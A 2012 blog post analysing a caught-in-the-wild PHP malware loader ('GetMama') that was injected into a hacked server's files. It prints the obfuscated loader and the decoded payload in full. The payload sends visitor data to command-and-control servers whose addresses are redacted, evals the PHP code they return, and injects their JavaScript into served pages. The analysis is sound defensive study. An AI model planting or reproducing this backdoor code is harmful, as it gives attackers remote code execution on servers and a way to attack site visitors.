---
title: GetMama Analysis, Having fun and reading PHP
date: 2012-04-16
tags:
    - malware
    - infosec
layout: layouts/old-post.njk
---

## Introduction

This is the result of combining tomorrow being holiday and liking too much to tinker into other people's code. In other words, this is some brief analisys of a real-wold caught-in-the-wild PHP malware that I got from a friend of mine.

I tried to write this article with a plain and easy to understand language. Still, this is a somewhat specific topic and you will need basic coding knowledge to understand it.

## History

So [a friend of mine](https://twitter.com/#!/Guill3m) (gr&agrave;cies!) told me about this server that was being hacked.

The problem was that a chunck of apparently nonsense was being appended on top of every *php* file.

He didn't give me the code of the application so I could find any vulnerabilities, but he showed me that funny chunck that was being appended to every file.

And well, it was funny indeed! It just looked like a huge pile of crammed together letters and symbols.

But was it just that? Let's see...

## The Loader

If you looked closely you could see some familiar terms. Dollar signs in very specific places. Some random *return*s. So I opened a text editor and started moving stuff around. This is what I got:

	/*5b71e190dfb2710d2d7383f6cb95ad21_on*/ 
	$GwXYUjpl11Wxase= array('7055','7072','7051','7062'); 
	$IDYNhwekmRFMoMVD9IrTSH4KyR8zacb9F0MNmRXzytbN6Xg5vy= array('7890','7905','7892','7888','7907','7892','7886','7893','7908','7901','7890','7907','7896','7902','7901'); 
	$o5KOurMT= array('3579','3578','3596','3582','3535','3533','3576','3581','3582','3580','3592','3581','3582'); 
	$hBRMKGiGQLQymNOIBcZMvzHh="SOME 9550 CHAR STRING"; 
	if (!function_exists("bDCEisaYjufI3XGa2")) 
	{ 
		function bDCEisaYjufI3XGa2($sVEQE4cMb2rYxk18P2LCllHaMeKlFWwwH0dbVfNX75M,$ODuVv6oHh) 
		{ 
			$XU1i6x4sTCjWE42iS0dvljYG5kCkRK = ''; 
			foreach($sVEQE4cMb2rYxk18P2LCllHaMeKlFWwwH0dbVfNX75M as $tvXyrltK4VTRpOJx) 
			{ 
				$XU1i6x4sTCjWE42iS0dvljYG5kCkRK .= chr($tvXyrltK4VTRpOJx - $ODuVv6oHh); 
			} 
			return $XU1i6x4sTCjWE42iS0dvljYG5kCkRK; 
		} 
		$Miio3ZxoILo = bDCEisaYjufI3XGa2($GwXYUjpl11Wxase,6954); 
		$nEnL9w3akcu = bDCEisaYjufI3XGa2($IDYNhwekmRFMoMVD9IrTSH4KyR8zacb9F0MNmRXzytbN6Xg5vy,7791); 
		$zndho5jwerL7h8mPJAAS5Nt5an5lppB0 = bDCEisaYjufI3XGa2($o5KOurMT,3481); 
		$V8SAifFzQDHPPnpgN8brs6rF1CUh = $nEnL9w3akcu('$iLzKu0SAvihZPWF2cLFbMXtJeYBHJIBl',$Miio3ZxoILo.'('.$zndho5jwerL7h8mPJAAS5Nt5an5lppB0.'($iLzKu0SAvihZPWF2cLFbMXtJeYBHJIBl));'); 
		$V8SAifFzQDHPPnpgN8brs6rF1CUh($hBRMKGiGQLQymNOIBcZMvzHh); 
	} 
	/*5b71e190dfb2710d2d7383f6cb95ad21_off*/

Well well well, this is some nice PHP! The problem are those not-really-so-readable function names. So let's give them better ones.

	/*malware_on*/ 
	$array1= array('7055','7072','7051','7062'); 
	$array2= array('7890','7905','7892','7888','7907','7892','7886','7893','7908','7901','7890','7907','7896','7902','7901'); 
	$array3= array('3579','3578','3596','3582','3535','3533','3576','3581','3582','3580','3592','3581','3582'); 
	$huge_string="SOME 9550 CHARACTER STRING"; 
	if (!function_exists("function1")) 
	{ 
		function function1($argument1,$argument2) 
		{ 
			$string1 = ''; 
			foreach($argument1 as $thing) 
			{ 
				$string1 .= chr($thing - $argument2); 
			} 
			return $string1; 
		} 
		$result1 = function1($array1,6954); 
		$result2 = function1($array2,7791); 
		$result3 = function1($array3,3481); 
		$final_result = $result2('$argument',$result1.'('.$result3.'($argument));'); 
		$final_result($huge_string); 
	} 
	/*malware_off*/ 

Now, this is better. We're dealing, as we could easily expect, with some PHP code being injected on top of the regular PHP code of the site. Let's take this by parts.

First thing that looks shady is that massive *$huge_string*. It must be of course some sort of payload that does something evil and despicable, but we don't really know how it actually *does it*. It's just a string there, isn't it? And there aren't any *eval*s or anything! Wait. Let's look at that function. It takes two arguments, being *argument1* a list of integers and *argument2* a single integer. It builds and returns a string by combining those numbers and translating them to their correspondent ASCII characters. With that we can calculate the values of the first three results:

	$result1 = eval 
	$result2 = create_function 
	$result3 = base64_decode 

Hah! Those who know a bit about typical PHP payloads will very easily see what's going on here. But let's keep looking at it. We have now *$final_result*. It looks like this

	$final_result = create_function('$argument', 'eval(base64_decode($argument));');

In other words, we're defining this function:

	function $final_result($argument) 
	{ 
		eval(base64_decode($argument); 
	}

So now we know how that big string transforms into something useful. 

## The Payload

Now, what's inside the base64-encoded string? This:

	eval(base64_decode("ANOTHER_HUGE_STRING"));

So they encoded it twice! Well. No. It's actually encoded four times. But after that, this is the beauty it reveals!

	if (!function_exists("GetMama")){  function mod_con($buf){str_ireplace("<body>","<body>",$buf,$cnt_h);if ($cnt_h == 1) {$buf = str_ireplace("<body>","<body>" . stripslashes($_SERVER["good"]),$buf); return $buf;}str_ireplace("</body>","</body>",$buf,$cnt_h);if ($cnt_h == 1) {$buf = str_ireplace("</body>",stripslashes($_SERVER["good"])."</body>",$buf); return $buf;}return $buf;}function opanki($buf){$gz_e = false;$h_l = headers_list();if (in_array("Content-Encoding: gzip", $h_l)) { $gz_e = true;}if ($gz_e){$tmpfname = tempnam("/tmp", "FOO");file_put_contents($tmpfname, $buf);$zd = gzopen($tmpfname, "r");$contents = gzread($zd, 10000000);$contents = mod_con($contents);gzclose($zd);unlink($tmpfname);$contents = gzencode($contents);} else {$contents = mod_con($buf);}$len = strlen($contents);header("Content-Length: ".$len);return($contents);} function GetMama(){$mother = "THE_COMPROMISED_DOMAIN";return $mother;}ob_start("opanki");function ahfudflfzdhfhs($pa){$mama = GetMama();$file = urlencode(__FILE__);if (isset($_SERVER["HTTP_HOST"])){$host = $_SERVER["HTTP_HOST"];} else {$host = "";}if (isset($_SERVER["REMOTE_ADDR"])){$ip = $_SERVER["REMOTE_ADDR"];} else {$ip = "";}if (isset($_SERVER["HTTP_REFERER"])){$ref = urlencode($_SERVER["HTTP_REFERER"]);} else {$ref = "";}if (isset($_SERVER["HTTP_USER_AGENT"])){$ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));} else {$ua = "";}if (isset($_SERVER["QUERY_STRING"])){$qs = urlencode($_SERVER["QUERY_STRING"]);} else {$qs = "";}$url_0 = "http://" . $pa;$url_1 = "/jedi.php?version=0993&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs;$try = true;if( function_exists("curl_init") ){$ch = curl_init($url_0 . $url_1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, 3);$ult = trim(curl_exec($ch));$try = false;} if ((ini_get("allow_url_fopen")) && $try) {$ult = trim(@file_get_contents($url_0 . $url_1));$try = false;}if($try){$fp = fsockopen($pa, 80, $errno, $errstr, 30);if ($fp) {$out = "GET $url_1 HTTP/1.0\r\n";$out .= "Host: $pa\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out);$ret = "";while (!feof($fp)) {$ret  .=  fgets($fp, 128);}fclose($fp);$ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));}}  if (strpos($ult,"eval") !== false){$z = stripslashes(str_replace("eval","",$ult)); eval($z); exit();}if (strpos($ult,"ebna") !== false){$_SERVER["good"] = str_replace("ebna","",$ult);return true;}else {return false;}}$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";$father2[] = "REDACTED_IP";shuffle($father2);foreach($father2 as $ur){if ( ahfudflfzdhfhs($ur) ) { break ;}}}

Again, we tidy it a bit and pad it nicely, having as result:

	if (!function_exists("GetMama")) 
	{  
		function mod_con($buf) 
		{ 
			str_ireplace("<body>","<body>",$buf,$cnt_h); 
			if ($cnt_h == 1) 
			{ 
				$buf = str_ireplace("<body>","<body>" . stripslashes($_SERVER["good"]),$buf); 
				return $buf; 
			} 
			str_ireplace("</body>","</body>",$buf,$cnt_h); 
			if ($cnt_h == 1) 
			{ 
				$buf = str_ireplace("</body>",stripslashes($_SERVER["good"])."</body>",$buf); return $buf; 
			} 
			return $buf; 
		} 
		function opanki($buf) 
		{ 
			$gz_e = false; 
			$h_l = headers_list(); 
			if (in_array("Content-Encoding: gzip", $h_l)) 
			{ 
				$gz_e = true; 
			} 
			if ($gz_e) 
			{ 
				$tmpfname = tempnam("/tmp", "FOO"); 
				file_put_contents($tmpfname, $buf); 
				$zd = gzopen($tmpfname, "r"); 
				$contents = gzread($zd, 10000000); 
				$contents = mod_con($contents); 
				gzclose($zd);unlink($tmpfname); 
				$contents = gzencode($contents); 
			} 
			else 
			{ 
				$contents = mod_con($buf); 
			} 
			$len = strlen($contents); 
			header("Content-Length: ".$len); 
			return($contents); 
		} 
		function GetMama() 
		{ 
			$mother = "THE_COMPROMISED_DOMAIN"; 
			return $mother; 
		} 
		ob_start("opanki"); 
		function ahfudflfzdhfhs($pa) 
		{ 
			$mama = GetMama(); 
			$file = urlencode(__FILE__); 
			if (isset($_SERVER["HTTP_HOST"])) 
			{ 
				$host = $_SERVER["HTTP_HOST"]; 
			} 
			else 
			{ 
				$host = ""; 
			} 
			if (isset($_SERVER["REMOTE_ADDR"])) 
			{ 
				$ip = $_SERVER["REMOTE_ADDR"]; 
			} 
			else 
			{ 
				$ip = ""; 
			} 
			if (isset($_SERVER["HTTP_REFERER"])) 
			{ 
				$ref = urlencode($_SERVER["HTTP_REFERER"]); 
			} 
			else 
			{ 
				$ref = ""; 
			} 
			if (isset($_SERVER["HTTP_USER_AGENT"])) 
			{ 
				$ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"])); 
			} else 
			{ 
				$ua = ""; 
			} 
			if (isset($_SERVER["QUERY_STRING"])) 
			{ 
				$qs = urlencode($_SERVER["QUERY_STRING"]); 
			} 
			else 
			{ 
				$qs = ""; 
			} 
			$url_0 = "http://" . $pa; 
			$url_1 = "/jedi.php?version=0993&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs; 
			$try = true; 
			if( function_exists("curl_init") ) 
			{ 
				$ch = curl_init($url_0 . $url_1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, 3); 
				$ult = trim(curl_exec($ch)); 
				$try = false; 
			} 
			if ((ini_get("allow_url_fopen")) && $try) 
			{ 
				$ult = trim(@file_get_contents($url_0 . $url_1)); 
				$try = false; 
			} 
			if($try) 
			{ 
				$fp = fsockopen($pa, 80, $errno, $errstr, 30); 
				if ($fp) 
				{ 
					$out = "GET $url_1 HTTP/1.0\r\n"; 
					$out .= "Host: $pa\r\n"; 
					$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out); 
					$ret = ""; 
					while (!feof($fp)) 
					{ 
						$ret  .=  fgets($fp, 128); 
					} 
					fclose($fp); 
					$ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4)); 
				} 
			}  
			if (strpos($ult,"eval") !== false) 
			{ 
				$z = stripslashes(str_replace("eval","",$ult)); 
				eval($z); 
				exit(); 
			} 
			if (strpos($ult,"ebna") !== false) 
			{ 
				$_SERVER["good"] = str_replace("ebna","",$ult); 
				return true; 
			} 
			else {return false;} 
		} 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		$father2[] = "REDACTED_IP"; 
		shuffle($father2); 
		foreach($father2 as $ur) 
		{ 
			if ( ahfudflfzdhfhs($ur) ) 
			{ 
				break ; 
			} 
		} 
	} 

Let's see what each function does. First we have *mod_con*. As we can see it just replaces the **body** tags, appending to them something passed to the server probably as a header or something like that in a variable called *good* inside the *$_SERVER* array. It also checks there's only one **body** tag and if there are more, apparently it does nothing. Hmmm... we need to investigate more.

Now we have *opanki*. It takes a buffer as only argument. This little bugger checks if the page is being served gzipped. If it isn't, it just returns *mod_con*(*$buf*) after adding a proper Content-Lenght header to the response. If it is, it creates a file and does some nonsense.

Anyway it ends returning the same, but gzipped.

Third function is *GetMama*. Despite the so-funny name, it just returns a string hardcoded to the domain that was being attacked. Probably just used to make sure the whole code is run only once (hence the *function_exists* on top of the script).

The last function is *ahfudflfzdhfhs*. In the beginning of it, it just gets some useful variables (HTTP_HOST, HTTP_REFEREER, REMOTE_ADDR, HTTP_USER_AGENT and QUERY_STRING).

It then builds an URL string that includes a hardcoded version number and those interesting variables ($url_0 and $url_1) and tries to do a request to it in three different ways, being, through a *cURL* session, *fopen*ing the URL or, if everything fails, with a good old simple *socket* connection.

That request returns a string that sets the *$ult* variable to some payload. If this payload includes the string *eval*, it's executed by *eval*ing it and the script exits. This represents a server-side attack. When some user navigates to the infected url, this script fetches PHP code from the command&control just and executes it, then dies.

If it has the string *ebna* in it, the payload is instead copied into a custom server variable, *good*. This returns *true*, so the execution continues. This is a client-side attack, and we can se how it works:

In the middle of the script we have this little line:

	ob_start("opanki");

This handy function starts a buffer. As long as this buffer isn't flushed, the request won't be sent to the client. This function also accepts a parameter: a callback function, in this case, *opanki*. This callback function will receive a string with the final output of the script. The callback function then does whatever to it, and returns another string that will be sent to the client. So the scenario goes as following:

First *ob_start* is called. All the functions are defined and we get into the *foreach* loop at the end of the code. It tries to fetch different IPs (stored in the *father2* array) using the *ahfudflfzdhfhs* function. When one responds, the javascript payload is stored into the *good* server variable and the function returns *true* triggering the *break* so the script keeps going. As this code was *on top* of the real php of the page, the site is normally executed and rendered, but nothing goes to the client:

it keeps storing in the buffer set up by *ob_start*.

At some point the script ends: no more code to execute. PHP assumes then that processing is done and flushes the response buffer. But before sending the content it passes it to *opanki*. And *opanki* adds that malicious javascript just after the *body* tag, then returns it and the server happily serves, giving the poor user a bucket of headaches!

## Conclusions

Well, I'm not an expert in web application malware, but most definitely this is a very interesting piece. As most pieces of PHP nasty code, it relies in *eval*ing code that will either execute it's malicious intentions in the server side or will load or alter in some way the final returned site, affecting the end user.

What is interesting of this specific code is that it relies fully in an external payload that can be set up independently and at any time by the controller. Very much in the fashion of the better known botnets, a large set of high-traffic sites infected with this code can be turned into any imaginable tool by swapping the final payload in the C&C, including mass-requests both from the server and from each client, malware installation in the server and all sorts of client-side nasty stuff like credentials stealing and XSSs.

*Note: This payload had some harcoded IPs that most likely belong to infected boxes that the author of this malware uses as puppet C&Cs. I didn't publish them because they may belong to unrelated users that have just been infected by generic botnet clients.*

**Update**: I poked around a bit the C&C IPs. They're geographically very diverse, and reverse DNS lookups didn't reveal any interesting patterns. But the obvious connection is that all of them are running *nginx* on port 80. So this smells like someone went around playing with outdated installations of nginx and dumping there the C&C script. The thing is, right now all of them show the nginx just-installed test page, and the C&C script doesn't work. Maybe everybody patched? Who knows. Interesting! Too bad I can't get any payload to play with :(
